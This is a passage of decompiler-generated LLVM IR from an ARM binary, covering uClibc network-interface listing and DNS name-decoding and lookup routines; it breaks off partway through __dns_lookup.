dec_label_pc_2f1ac:                               ; preds = %dec_label_pc_2f19c
  %v3_2f1ac = udiv i32 %v3_2f19c, 32
  store i32 %v3_2f1ac, i32* @sb, align 4
  %v1_2f1b0 = mul nuw nsw i32 %v3_2f1ac, 8
  %v3_2f1b4 = add nuw nsw i32 %v1_2f1b0, 8
  %v1_2f1b8 = call i32 @malloc(i32 %v3_2f1b4)
  store i32 %v1_2f1b8, i32* @sl, align 4
  %v2_2f1bc = icmp eq i32 %v1_2f1b8, 0
  br i1 %v2_2f1bc, label %dec_label_pc_2f1c8, label %dec_label_pc_2f288.preheader

dec_label_pc_2f288.preheader:                     ; preds = %dec_label_pc_2f1ac
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_2f288

dec_label_pc_2f1c8:                               ; preds = %dec_label_pc_2f1ac
  %v0_2f1d4 = call i32 @__GI___errno_location()
  %v2_2f1dc = inttoptr i32 %v0_2f1d4 to i32*
  store i32 105, i32* %v2_2f1dc, align 4
  br label %dec_label_pc_2f2b0

dec_label_pc_2f1e4:                               ; preds = %dec_label_pc_2f288
  %v4_2f1e8 = mul i32 %v1_2f1e8, 32
  %v5_2f1e8 = add i32 %v4_2f1e8, %v2_2f154
  store i32 %v5_2f1e8, i32* @r4, align 4
  %v1_2f1f0 = inttoptr i32 %v5_2f1e8 to i8*
  %v2_2f1f0 = call i32 @__GI_strdup(i8* %v1_2f1f0)
  store i32 %v2_2f1f0, i32* @r3, align 4
  %v2_2f1f8 = icmp eq i32 %v2_2f1f0, 0
  %v0_2f200 = load i32, i32* @r6, align 4
  %v0_2f204 = load i32, i32* @r4, align 4
  store i32 %v0_2f204, i32* %r2.global-to-local, align 4
  %v1_2f208 = load i32, i32* @r8, align 4
  %v2_2f208 = add i32 %v1_2f208, 4
  %v3_2f208 = inttoptr i32 %v2_2f208 to i32*
  store i32 %v2_2f1f0, i32* %v3_2f208, align 4
  br i1 %v2_2f1f8, label %dec_label_pc_2f21c, label %dec_label_pc_2f210

dec_label_pc_2f210:                               ; preds = %dec_label_pc_2f1e4
  %v3_2f210 = call i32 @ioctl(i32 %v0_2f200, i32 35123, i32 %v0_2f204)
  %v1_2f214 = icmp slt i32 %v3_2f210, 0
  br i1 %v1_2f214, label %dec_label_pc_2f21c, label %dec_label_pc_2f27c

dec_label_pc_2f21c:                               ; preds = %dec_label_pc_2f210, %dec_label_pc_2f1e4
  %v0_2f21c = call i32 @__GI___errno_location()
  %v1_2f220 = inttoptr i32 %v0_2f21c to i32*
  %v2_2f220 = load i32, i32* %v1_2f220, align 4
  store i32 %v2_2f220, i32* @r4, align 4
  store i32 %v0_2f21c, i32* @r8, align 4
  br label %dec_label_pc_2f238

dec_label_pc_2f230:                               ; preds = %dec_label_pc_2f238
  %v4_2f23c = mul i32 %v0_2f240, 8
  %v5_2f23c = add i32 %v0_2f23c, %v4_2f23c
  %v1_2f230 = add i32 %v5_2f23c, 4
  %v2_2f230 = inttoptr i32 %v1_2f230 to i32*
  %v3_2f230 = load i32, i32* %v2_2f230, align 4
  store i32 %v3_2f230, i32* @r0, align 4
  %v0_2f234 = call i32 @free()
  %v0_2f238.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_2f238

dec_label_pc_2f238:                               ; preds = %dec_label_pc_2f21c, %dec_label_pc_2f230
  %v0_2f240 = phi i32 [ 0, %dec_label_pc_2f21c ], [ %v0_2f238.pre, %dec_label_pc_2f230 ]
  %v0_2f23c = load i32, i32* @sl, align 4
  %v2_2f23c = and i32 %v0_2f240, 536870912
  %v3_2f23c = icmp eq i32 %v2_2f23c, 0
  %v1_2f240 = add i32 %v0_2f240, 1
  store i32 %v1_2f240, i32* @r7, align 4
  br i1 %v3_2f23c, label %dec_label_pc_2f230, label %dec_label_pc_2f248

dec_label_pc_2f248:                               ; preds = %dec_label_pc_2f238
  store i32 %v0_2f23c, i32* @r0, align 4
  %v0_2f24c = call i32 @free()
  %v0_2f25c = load i32, i32* @r4, align 4
  %v7_2f25c = icmp eq i32 %v0_2f25c, 22
  br i1 %v7_2f25c, label %bb24, label %dec_label_pc_2f268

bb24:                                             ; preds = %dec_label_pc_2f248
  br label %bb26

dec_label_pc_2f268:                               ; preds = %dec_label_pc_2f248
  %v7_2f268 = icmp eq i32 %v0_2f25c, 12
  br i1 %v7_2f268, label %bb25, label %bb26

bb25:                                             ; preds = %dec_label_pc_2f268
  br label %bb26

bb26:                                             ; preds = %bb24, %dec_label_pc_2f268, %bb25
  %v0_2f274 = phi i32 [ 38, %bb24 ], [ %v0_2f25c, %dec_label_pc_2f268 ], [ 105, %bb25 ]
  store i32 0, i32* @sl, align 4
  %v1_2f274 = load i32, i32* @r8, align 4
  %v2_2f274 = inttoptr i32 %v1_2f274 to i32*
  store i32 %v0_2f274, i32* %v2_2f274, align 4
  br label %dec_label_pc_2f2b0

dec_label_pc_2f27c:                               ; preds = %dec_label_pc_2f210
  %v0_2f27c = load i32, i32* @r4, align 4
  %v1_2f27c = add i32 %v0_2f27c, 16
  %v2_2f27c = inttoptr i32 %v1_2f27c to i32*
  %v3_2f27c = load i32, i32* %v2_2f27c, align 4
  %v1_2f280 = load i32, i32* @sl, align 4
  %v2_2f280 = load i32, i32* @r7, align 4
  %v3_2f280 = add i32 %v2_2f280, %v1_2f280
  %v4_2f280 = inttoptr i32 %v3_2f280 to i32*
  store i32 %v3_2f27c, i32* %v4_2f280, align 4
  %v0_2f284 = load i32, i32* @r5, align 4
  %v1_2f284 = add i32 %v0_2f284, 1
  store i32 %v1_2f284, i32* @r5, align 4
  %v0_2f290.pre = load i32, i32* @sl, align 4
  br label %dec_label_pc_2f288

dec_label_pc_2f288:                               ; preds = %dec_label_pc_2f288.preheader, %dec_label_pc_2f27c
  %v1_2f29c = phi i32 [ %v1_2f1b8, %dec_label_pc_2f288.preheader ], [ %v0_2f290.pre, %dec_label_pc_2f27c ]
  %v1_2f1e8 = phi i32 [ 0, %dec_label_pc_2f288.preheader ], [ %v1_2f284, %dec_label_pc_2f27c ]
  %v3_2f288 = mul i32 %v1_2f1e8, 8
  store i32 %v3_2f288, i32* @r7, align 4
  %v1_2f28c = load i32, i32* @sb, align 4
  %v3_2f28c = icmp ult i32 %v1_2f1e8, %v1_2f28c
  %v2_2f290 = add i32 %v3_2f288, %v1_2f29c
  store i32 %v2_2f290, i32* @r8, align 4
  br i1 %v3_2f28c, label %dec_label_pc_2f1e4, label %dec_label_pc_2f298

dec_label_pc_2f298:                               ; preds = %dec_label_pc_2f288
  store i32 0, i32* %r2.global-to-local, align 4
  %v4_2f29c = inttoptr i32 %v2_2f290 to i32*
  store i32 0, i32* %v4_2f29c, align 4
  %v0_2f2a0 = load i32, i32* %r2.global-to-local, align 4
  %v1_2f2a0 = load i32, i32* @r8, align 4
  %v2_2f2a0 = add i32 %v1_2f2a0, 4
  %v3_2f2a0 = inttoptr i32 %v2_2f2a0 to i32*
  store i32 %v0_2f2a0, i32* %v3_2f2a0, align 4
  br label %dec_label_pc_2f2b0

dec_label_pc_2f2b0:                               ; preds = %dec_label_pc_2f298, %bb26, %dec_label_pc_2f1c8, %dec_label_pc_2f194
  %v0_2f2b0 = load i32, i32* @sl, align 4
  ret i32 %v0_2f2b0

; uselistorder directives
  uselistorder i32 %v3_2f288, { 1, 0 }
  uselistorder i32 %v1_2f1e8, { 2, 0, 1 }
  uselistorder i32 %v0_2f25c, { 1, 0, 2 }
  uselistorder i32 %v3_2f19c, { 0, 1, 3, 2 }
  uselistorder i32 %v3_2f164, { 1, 0 }
  uselistorder i32 %v2_2f148, { 2, 3, 1, 0 }
  uselistorder i32 %stack_var_-52.0, { 1, 0 }
  uselistorder i32 %v2_2f164, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32 38, { 2, 9, 0, 1, 5, 6, 7, 8, 3, 4 }
  uselistorder i32 ()* @__opensock, { 2, 1, 0 }
  uselistorder label %dec_label_pc_2f288, { 1, 0 }
  uselistorder label %bb26, { 2, 1, 0 }
  uselistorder label %dec_label_pc_2f238, { 1, 0 }
  uselistorder label %bb23, { 1, 0 }
}

define i32 @__GI_if_freenameindex(i32* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* @r5, align 4
  br label %dec_label_pc_2f2e4

dec_label_pc_2f2dc:                               ; preds = %dec_label_pc_2f2f0, %dec_label_pc_2f2e4
  %v0_2f2dc = call i32 @free()
  %v0_2f2e0 = load i32, i32* @r4, align 4
  %v1_2f2e0 = add i32 %v0_2f2e0, 8
  br label %dec_label_pc_2f2e4

dec_label_pc_2f2e4:                               ; preds = %entry, %dec_label_pc_2f2dc
  %v0_2f2f0 = phi i32 [ %tmp, %entry ], [ %v1_2f2e0, %dec_label_pc_2f2dc ]
  store i32 %v0_2f2f0, i32* @r4, align 4
  %v1_2f2e4 = add i32 %v0_2f2f0, 4
  %v2_2f2e4 = inttoptr i32 %v1_2f2e4 to i32*
  %v3_2f2e4 = load i32, i32* %v2_2f2e4, align 4
  store i32 %v3_2f2e4, i32* @r0, align 4
  %v2_2f2e8 = icmp eq i32 %v3_2f2e4, 0
  br i1 %v2_2f2e8, label %dec_label_pc_2f2f0, label %dec_label_pc_2f2dc

dec_label_pc_2f2f0:                               ; preds = %dec_label_pc_2f2e4
  %v1_2f2f0 = inttoptr i32 %v0_2f2f0 to i32*
  %v2_2f2f0 = load i32, i32* %v1_2f2f0, align 4
  %v2_2f2f4 = icmp eq i32 %v2_2f2f0, 0
  br i1 %v2_2f2f4, label %dec_label_pc_2f2fc, label %dec_label_pc_2f2dc

dec_label_pc_2f2fc:                               ; preds = %dec_label_pc_2f2f0
  %v0_2f2fc = load i32, i32* @r5, align 4
  store i32 %v0_2f2fc, i32* @r0, align 4
  %v0_2f300 = call i32 @free()
  ret i32 %v0_2f300

; uselistorder directives
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder label %dec_label_pc_2f2e4, { 1, 0 }
}

define i32 @__decode_dotted(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_0 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_2f310 = load i32, i32* @r4, align 4
  store i32 %v3_2f310, i32* %stack_var_-36, align 4
  %v6_2f310 = load i32, i32* @r5, align 4
  %v0_2f314 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_2f314, i32* %sl.global-to-local, align 4
  %v2_2f314 = icmp eq i32 %v0_2f314, 0
  br i1 %v2_2f314, label %.thread30, label %dec_label_pc_2f33c.preheader

.thread30:                                        ; preds = %entry
  store i32 %arg2, i32* %fp.global-to-local, align 4
  %v0_2f3242 = load i32, i32* @r3, align 4
  store i32 %v0_2f3242, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_2f3fc

dec_label_pc_2f33c.preheader:                     ; preds = %entry
  store i32 0, i32* %r8.global-to-local, align 4
  store i32 %arg2, i32* %fp.global-to-local, align 4
  %v0_2f324 = load i32, i32* @r3, align 4
  store i32 %v0_2f324, i32* %sb.global-to-local, align 4
  store i32 1, i32* @ip, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_2f33c4 = load i32, i32* @r1, align 4
  %v6_2f34014 = icmp slt i32 %v0_2f33c4, %arg2
  br i1 %v6_2f34014, label %dec_label_pc_2f344.preheader, label %dec_label_pc_2f3fc

dec_label_pc_2f344.preheader:                     ; preds = %dec_label_pc_2f33c.preheader
  %v2_2f34451 = add i32 %v0_2f314, %v0_2f33c4
  %v3_2f34452 = inttoptr i32 %v2_2f34451 to i8*
  %v4_2f34453 = load i8, i8* %v3_2f34452, align 1
  %v6_2f34454 = zext i8 %v4_2f34453 to i32
  store i32 %v6_2f34454, i32* @r4, align 4
  %v2_2f34855 = icmp eq i8 %v4_2f34453, 0
  br i1 %v2_2f34855, label %bb49, label %dec_label_pc_2f350

dec_label_pc_2f338:                               ; preds = %bb48, %bb44
  %v1_2f33c = phi i32 [ %v1_2f33c.pre, %bb48 ], [ %v1_2f36859, %bb44 ]
  %v0_2f33c = phi i32 [ %v0_2f33c.pre, %bb48 ], [ %v5_2f380, %bb44 ]
  %v0_2f338 = phi i32 [ %v0_2f338.pre, %bb48 ], [ %v0_2f38460, %bb44 ]
  store i32 %v0_2f338, i32* %r0.global-to-local, align 4
  %v6_2f340 = icmp slt i32 %v0_2f33c, %v1_2f33c
  br i1 %v6_2f340, label %dec_label_pc_2f338.dec_label_pc_2f344_crit_edge, label %dec_label_pc_2f3fc

dec_label_pc_2f338.dec_label_pc_2f344_crit_edge:  ; preds = %dec_label_pc_2f338
  %v0_2f344.pre = load i32, i32* %sl.global-to-local, align 4
  %v2_2f344 = add i32 %v0_2f344.pre, %v0_2f33c
  %v3_2f344 = inttoptr i32 %v2_2f344 to i8*
  %v4_2f344 = load i8, i8* %v3_2f344, align 1
  %v6_2f344 = zext i8 %v4_2f344 to i32
  store i32 %v6_2f344, i32* @r4, align 4
  %v2_2f348 = icmp eq i8 %v4_2f344, 0
  %v0_2f3e8 = load i32, i32* @ip, align 4
  %v2_2f3e8 = icmp eq i32 %v0_2f3e8, 0
  br i1 %v2_2f348, label %dec_label_pc_2f3e8, label %dec_label_pc_2f350

dec_label_pc_2f350:                               ; preds = %dec_label_pc_2f344.preheader, %dec_label_pc_2f338.dec_label_pc_2f344_crit_edge
  %v2_2f3e866 = phi i1 [ %v2_2f3e8, %dec_label_pc_2f338.dec_label_pc_2f344_crit_edge ], [ false, %dec_label_pc_2f344.preheader ]
  %v0_2f3e864 = phi i32 [ %v0_2f3e8, %dec_label_pc_2f338.dec_label_pc_2f344_crit_edge ], [ 1, %dec_label_pc_2f344.preheader ]
  %v6_2f34463 = phi i32 [ %v6_2f344, %dec_label_pc_2f338.dec_label_pc_2f344_crit_edge ], [ %v6_2f34454, %dec_label_pc_2f344.preheader ]
  %v0_2f37062 = phi i32 [ %v0_2f344.pre, %dec_label_pc_2f338.dec_label_pc_2f344_crit_edge ], [ %v0_2f314, %dec_label_pc_2f344.preheader ]
  %v0_2f36061 = phi i32 [ %v0_2f33c, %dec_label_pc_2f338.dec_label_pc_2f344_crit_edge ], [ %v0_2f33c4, %dec_label_pc_2f344.preheader ]
  %v0_2f38460 = phi i32 [ %v0_2f338, %dec_label_pc_2f338.dec_label_pc_2f344_crit_edge ], [ 0, %dec_label_pc_2f344.preheader ]
  %v1_2f36859 = phi i32 [ %v1_2f33c, %dec_label_pc_2f338.dec_label_pc_2f344_crit_edge ], [ %arg2, %dec_label_pc_2f344.preheader ]
  %v1_2f354 = and i32 %v6_2f34463, 192
  br i1 %v2_2f3e866, label %bb42, label %bb

bb:                                               ; preds = %dec_label_pc_2f350
  %v1_2f358 = load i32, i32* %r8.global-to-local, align 4
  %v2_2f358 = add i32 %v1_2f358, 1
  store i32 %v2_2f358, i32* %r8.global-to-local, align 4
  br label %bb42

bb42:                                             ; preds = %dec_label_pc_2f350, %bb
  %v2_2f35c = icmp eq i32 %v1_2f354, 192
  %v1_2f360 = add i32 %v0_2f36061, 1
  store i32 %v1_2f360, i32* %r1.global-to-local, align 4
  br i1 %v2_2f35c, label %dec_label_pc_2f368, label %dec_label_pc_2f390

dec_label_pc_2f368:                               ; preds = %bb42
  %v6_2f36c = icmp slt i32 %v1_2f360, %v1_2f36859
  br i1 %v6_2f36c, label %dec_label_pc_2f370, label %dec_label_pc_2f3fc

dec_label_pc_2f370:                               ; preds = %dec_label_pc_2f368
  %v2_2f370 = add i32 %v1_2f360, %v0_2f37062
  %v3_2f370 = inttoptr i32 %v2_2f370 to i8*
  %v4_2f370 = load i8, i8* %v3_2f370, align 1
  %v6_2f370 = zext i8 %v4_2f370 to i32
  %v1_2f378 = urem i32 %v6_2f34463, 64
  br i1 %v2_2f3e866, label %bb44, label %bb43

bb43:                                             ; preds = %dec_label_pc_2f370
  %v1_2f37c = load i32, i32* %r8.global-to-local, align 4
  %v2_2f37c = add i32 %v1_2f37c, 1
  store i32 %v2_2f37c, i32* %r8.global-to-local, align 4
  br label %bb44

bb44:                                             ; preds = %dec_label_pc_2f370, %bb43
  %v4_2f380 = mul nuw nsw i32 %v1_2f378, 256
  %v5_2f380 = or i32 %v6_2f370, %v4_2f380
  store i32 %v5_2f380, i32* %r1.global-to-local, align 4
  store i32 %v0_2f38460, i32* %r7.global-to-local, align 4
  store i32 0, i32* @ip, align 4
  br label %dec_label_pc_2f338

dec_label_pc_2f390:                               ; preds = %bb42
  %v2_2f390 = add i32 %v6_2f34463, %v0_2f38460
  store i32 %v2_2f390, i32* %r6.global-to-local, align 4
  %v3_2f394 = load i32, i32* %stack_var_0, align 4
  store i32 %v3_2f394, i32* @r3, align 4
  %v1_2f398 = add i32 %v2_2f390, 1
  store i32 %v1_2f398, i32* %r7.global-to-local, align 4
  %v3_2f39c = icmp ult i32 %v1_2f398, %v3_2f394
  br i1 %v3_2f39c, label %dec_label_pc_2f3a4, label %dec_label_pc_2f3fc

dec_label_pc_2f3a4:                               ; preds = %dec_label_pc_2f390
  %v2_2f3a4 = add i32 %v6_2f34463, %v1_2f360
  store i32 %v2_2f3a4, i32* @r5, align 4
  %v3_2f3a8 = icmp ult i32 %v2_2f3a4, %v1_2f36859
  br i1 %v3_2f3a8, label %dec_label_pc_2f3b0, label %dec_label_pc_2f3fc

dec_label_pc_2f3b0:                               ; preds = %dec_label_pc_2f3a4
  %v2_2f3b0 = add i32 %v1_2f360, %v0_2f37062
  store i32 %v2_2f3b0, i32* @r1, align 4
  %v0_2f3b4 = load i32, i32* %sb.global-to-local, align 4
  %v2_2f3b4 = add i32 %v0_2f3b4, %v0_2f38460
  store i32 %v2_2f3b4, i32* @r0, align 4
  store i32 %v6_2f34463, i32* @r2, align 4
  %v0_2f3c0 = call i32 @memcpy()
  store i32 %v0_2f3c0, i32* %r0.global-to-local, align 4
  store i32 %v0_2f3e864, i32* @ip, align 4
  %v0_2f3c8 = load i32, i32* %sl.global-to-local, align 4
  %v1_2f3c8 = load i32, i32* @r5, align 4
  %v2_2f3c8 = add i32 %v1_2f3c8, %v0_2f3c8
  %v3_2f3c8 = inttoptr i32 %v2_2f3c8 to i8*
  %v4_2f3c8 = load i8, i8* %v3_2f3c8, align 1
  br i1 %v2_2f3e866, label %bb46, label %bb45

bb45:                                             ; preds = %dec_label_pc_2f3b0
  %v1_2f3d0 = load i32, i32* %r8.global-to-local, align 4
  %v2_2f3d0 = load i32, i32* @r4, align 4
  %v3_2f3d0 = add i32 %v2_2f3d0, %v1_2f3d0
  store i32 %v3_2f3d0, i32* %r8.global-to-local, align 4
  br label %bb46

bb46:                                             ; preds = %dec_label_pc_2f3b0, %bb45
  %v2_2f3d4 = icmp eq i8 %v4_2f3c8, 0
  br i1 %v2_2f3d4, label %bb48, label %bb47

bb47:                                             ; preds = %bb46
  br label %bb48

bb48:                                             ; preds = %bb46, %bb47
  %v0_2f3e0.off0 = phi i8 [ 0, %bb46 ], [ 46, %bb47 ]
  store i32 %v1_2f3c8, i32* %r1.global-to-local, align 4
  %v2_2f3e0 = load i32, i32* %sb.global-to-local, align 4
  %v3_2f3e0 = load i32, i32* %r6.global-to-local, align 4
  %v4_2f3e0 = add i32 %v3_2f3e0, %v2_2f3e0
  %v5_2f3e0 = inttoptr i32 %v4_2f3e0 to i8*
  store i8 %v0_2f3e0.off0, i8* %v5_2f3e0, align 1
  %v0_2f338.pre = load i32, i32* %r7.global-to-local, align 4
  %v0_2f33c.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_2f33c.pre = load i32, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_2f338

dec_label_pc_2f3e8:                               ; preds = %dec_label_pc_2f338.dec_label_pc_2f344_crit_edge
  %v0_2f3f0.pre.pre = load i32, i32* %r8.global-to-local, align 4
  br i1 %v2_2f3e8, label %dec_label_pc_2f3fc, label %bb49

bb49:                                             ; preds = %dec_label_pc_2f344.preheader, %dec_label_pc_2f3e8
  %v0_2f3f0.pre69 = phi i32 [ %v0_2f3f0.pre.pre, %dec_label_pc_2f3e8 ], [ 0, %dec_label_pc_2f344.preheader ]
  %v2_2f3ec = add i32 %v0_2f3f0.pre69, 1
  store i32 %v2_2f3ec, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_2f3fc

dec_label_pc_2f3fc:                               ; preds = %dec_label_pc_2f3a4, %dec_label_pc_2f390, %dec_label_pc_2f368, %dec_label_pc_2f338, %dec_label_pc_2f3e8, %dec_label_pc_2f33c.preheader, %bb49, %.thread30
  %storemerge = phi i32 [ -1, %.thread30 ], [ %v2_2f3ec, %bb49 ], [ -1, %dec_label_pc_2f33c.preheader ], [ %v0_2f3f0.pre.pre, %dec_label_pc_2f3e8 ], [ -1, %dec_label_pc_2f390 ], [ -1, %dec_label_pc_2f3a4 ], [ -1, %dec_label_pc_2f338 ], [ -1, %dec_label_pc_2f368 ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  %v2_2f400 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_2f400, i32* @r4, align 4
  store i32 %v6_2f310, i32* @r5, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v0_2f3f0.pre.pre, { 1, 0 }
  uselistorder i32 %v1_2f3c8, { 1, 0 }
  uselistorder i32 %v5_2f380, { 1, 0 }
  uselistorder i32 %v1_2f360, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v0_2f38460, { 3, 2, 0, 1 }
  uselistorder i32 %v6_2f34463, { 2, 4, 3, 0, 1 }
  uselistorder i1 %v2_2f3e866, { 1, 2, 0 }
  uselistorder i32 %v0_2f314, { 0, 1, 3, 2 }
  uselistorder i32* %sl.global-to-local, { 1, 0, 2 }
  uselistorder i32* %sb.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32* %r8.global-to-local, { 0, 4, 1, 5, 2, 6, 3, 7, 8 }
  uselistorder i32* %r0.global-to-local, { 2, 5, 3, 4, 0, 1 }
  uselistorder i32* %fp.global-to-local, { 1, 2, 0 }
  uselistorder i32 %arg2, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_2f3fc, { 6, 4, 0, 1, 2, 3, 5, 7 }
  uselistorder label %bb49, { 1, 0 }
  uselistorder label %bb48, { 1, 0 }
  uselistorder label %bb46, { 1, 0 }
  uselistorder label %bb44, { 1, 0 }
  uselistorder label %bb42, { 1, 0 }
  uselistorder label %dec_label_pc_2f350, { 1, 0 }
}

define i32 @__dns_lookup(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %tmp144 = call i32 @__decompiler_undefined_function_0()
  %tmp159 = call i32 @__decompiler_undefined_function_0()
  %tmp160 = call i32 @__decompiler_undefined_function_0()
  %tmp161 = call i32 @__decompiler_undefined_function_0()
  %tmp172 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-448 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-192 = alloca i32, align 4
  %stack_var_-88 = alloca i32, align 4
  %stack_var_-104 = alloca i16, align 2
  %stack_var_-76 = alloca i32, align 4
  %v3_2f408 = load i32, i32* @r4, align 4
  %v6_2f408 = load i32, i32* @r5, align 4
  %v9_2f408 = load i32, i32* @r6, align 4
  %v12_2f408 = load i32, i32* @r7, align 4
  %v15_2f408 = load i32, i32* @r8, align 4
  %v18_2f408 = load i32, i32* @sb, align 4
  %v21_2f408 = load i32, i32* @sl, align 4
  %v24_2f408 = load i32, i32* @fp, align 4
  %v27_2f408 = load i32, i32* @lr, align 4
  store i32 %tmp, i32* @r4, align 4
  store i32 %arg4, i32* @fp, align 4
  %v0_2f41c = load i32, i32* %r1.global-to-local, align 4
  %v1_2f424 = call i32 @malloc(i32 512)
  store i32 %v1_2f424, i32* @sl, align 4
  %v0_2f42c = load i32, i32* @r4, align 4
  %v1_2f42c = inttoptr i32 %v0_2f42c to i8*
  %v3_2f430 = call i32 @strlen(i8* %v1_2f42c)
  store i32 894, i32* %r3.global-to-local, align 4
  %v3_2f43c = icmp ugt i32 %v3_2f430, 893
  store i1 %v3_2f43c, i1* %cpsr_c.global-to-local, align 1
  store i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32* @r8, align 4
  %tmp285 = icmp ugt i32 %v3_2f430, 894
  br i1 %tmp285, label %.thread132, label %dec_label_pc_2f45c

.thread132:                                       ; preds = %entry
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_2fb6c

dec_label_pc_2f45c:                               ; preds = %entry
  %v1_2f460 = add i32 %v3_2f430, 130
  %v1_2f464 = call i32 @malloc(i32 %v1_2f460)
  store i32 %v1_2f464, i32* @r0, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_2f468 = icmp eq i32 %v1_2f464, 0
  br i1 %v2_2f468, label %.thread5, label %bb

bb:                                               ; preds = %dec_label_pc_2f45c
  %v1_2f46c = load i32, i32* @sl, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v3_2f46c = icmp eq i32 %v1_2f46c, 0
  br i1 %v3_2f46c, label %bb213, label %dec_label_pc_2f480

.thread5:                                         ; preds = %dec_label_pc_2f45c
  store i32 1, i32* @r5, align 4
  br label %dec_label_pc_2fb64

bb213:                                            ; preds = %bb
  store i32 1, i32* @r5, align 4
  br label %dec_label_pc_2fb64

dec_label_pc_2f480:                               ; preds = %bb
  store i32 0, i32* @r5, align 4
  %v0_2f480 = load i32, i32* @r4, align 4
  %v1_2f480 = inttoptr i32 %v0_2f480 to i8*
  %v2_2f480 = load i8, i8* %v1_2f480, align 1
  %v3_2f480 = zext i8 %v2_2f480 to i32
  store i32 %v3_2f480, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_2f484 = icmp eq i8 %v2_2f480, 0
  br i1 %v2_2f484, label %dec_label_pc_2fb64, label %dec_label_pc_2f48c

dec_label_pc_2f48c:                               ; preds = %dec_label_pc_2f480
  %v2_2f490 = add i32 %v0_2f480, %v3_2f430
  store i32 %v2_2f490, i32* %r3.global-to-local, align 4
  %v1_2f494 = add i32 %v2_2f490, -1
  %v2_2f494 = inttoptr i32 %v1_2f494 to i8*
  %v3_2f494 = load i8, i8* %v2_2f494, align 1
  %v4_2f494 = zext i8 %v3_2f494 to i32
  store i32 %v4_2f494, i32* @r3, align 4
  store i32 %v3_2f430, i32* @r2, align 4
  store i32 %v0_2f480, i32* @r1, align 4
  %v0_2f4a4 = call i32 @memcpy()
  store i32 36, i32* %r3.global-to-local, align 4
  store i32 61988, i32* %ip.global-to-local, align 4
  store i32 55944, i32* %r1.global-to-local, align 4
  store i32 -1, i32* @sb, align 4
  %v2_2f520 = ptrtoint i32* %stack_var_-76 to i32
  %v2_2f638 = ptrtoint i16* %stack_var_-104 to i32
  %v15_2f63c = ptrtoint i32* %stack_var_-88 to i32
  %v2_2f660 = ptrtoint i32* %stack_var_-192 to i32
  %v2_2f734 = ptrtoint i32* %stack_var_-48 to i32
  %v2_2f740 = ptrtoint i32* %stack_var_-56 to i32
  %v2_2f7cc = icmp eq i32 %tmp161, 0
  %v1_2f7d8 = add i32 %tmp160, -2
  %v2_2f7dc = icmp ne i32 %v1_2f7d8, 0
  %tmp214 = icmp slt i32 %tmp159, 1
  %v2_2f8c8 = ptrtoint i32* %stack_var_-448 to i32
  %v2_2f8cc = ptrtoint i32* %stack_var_-144 to i32
  %v5_2fb1056 = icmp sgt i32 %tmp159, 0
  %v2_2fa38 = icmp ne i32 %v0_2f41c, 0
  %v7_2fa38 = icmp eq i32 %v0_2f41c, 1
  %v1_2f92c = bitcast i32* %stack_var_-448 to i8*
  %v2_2f9e0 = icmp eq i32 %tmp144, 0
  %v2_2f7e8 = icmp ugt i8 %v3_2f494, 45
  %v7_2f7e8 = icmp eq i8 %v3_2f494, 46
  %v1_2f594 = add i32 %v1_2f464, 1
  %stack_var_-476.0.pre = load i32, i32* @r5, align 4
  %v4_2f574 = add i32 %v1_2f464, %v3_2f430
  %v5_2f574 = inttoptr i32 %v4_2f574 to i8*
  %v1_2f7d8.cmp = icmp ugt i32 %v1_2f7d8, 1
  %v2_2f810 = icmp eq i32 %tmp160, 0
  %v3_2fa3c = icmp ugt i32 %v0_2f41c, 27
  %v8_2fa3c = icmp eq i32 %v0_2f41c, 28
  br label %dec_label_pc_2f504

dec_label_pc_2f504:                               ; preds = %dec_label_pc_2fb4c, %dec_label_pc_2f48c
  %stack_var_-476.0 = phi i32 [ %stack_var_-476.0.pre, %dec_label_pc_2f48c ], [ %v1_2fb50, %dec_label_pc_2fb4c ]
  %stack_var_-464.0 = phi i32 [ %tmp172, %dec_label_pc_2f48c ], [ %v3_2f618, %dec_label_pc_2fb4c ]
  %stack_var_-468.0 = phi i32 [ -1, %dec_label_pc_2f48c ], [ %stack_var_-468.2, %dec_label_pc_2fb4c ]
